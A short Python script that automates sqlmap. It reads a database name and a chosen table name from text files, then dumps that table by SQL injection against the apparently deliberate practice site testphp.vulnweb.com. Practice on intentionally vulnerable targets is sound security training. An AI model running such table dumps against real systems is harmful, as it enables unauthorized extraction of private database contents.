import subprocess
import re

# Function to extract the database name from database_name.txt
def extract_database_name(filename):
    with open(filename, 'r') as file:
        content = file.read()
        matches = re.findall(r'\[\*\] (.+)', content)
        if matches:
            return matches[0]
        else:
            return None

# Function to prompt the user and get the selected table number
def get_user_input():
    while True:
        try:
            table_number = int(input("Enter the table number (1-8) you want to dump information for: "))
            if 1 <= table_number <= 8:
                return table_number
            else:
                print("Invalid input. Please enter a number between 1 and 8.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

# Function to perform SQLMap-like functionality
def sqlmap_functionality(base_url, database_filename, table_filename):
    # Extract database name
    database_name = extract_database_name(database_filename)
    if not database_name:
        print("Error: Unable to extract database name")
        return

    # Get user input for table selection
    table_number = get_user_input()

    # Extract table name based on user input
    table_name = f"{table_number}. (.+)"
    with open(table_filename, 'r') as file:
        content = file.read()
        matches = re.findall(table_name, content)
        if not matches:
            print("Error: Unable to extract table name")
            return

        table_name = matches[0]

    # Build SQLMap command
    sqlmap_command = [
        "sqlmap",
        "-u", f"{base_url}?cat=1",
        "-D", database_name,
        "-T", table_name,
        "--dump",
        "--batch"
    ]

    # Execute SQLMap command
    try:
        subprocess.run(sqlmap_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: SQLMap execution failed with return code {e.returncode}")

# Example usage
if __name__ == "__main__":
    base_url = "http://testphp.vulnweb.com/listproducts.php"
    database_filename = "database_names.txt"
    table_filename = "output.txt"

    sqlmap_functionality(base_url, database_filename, table_filename)
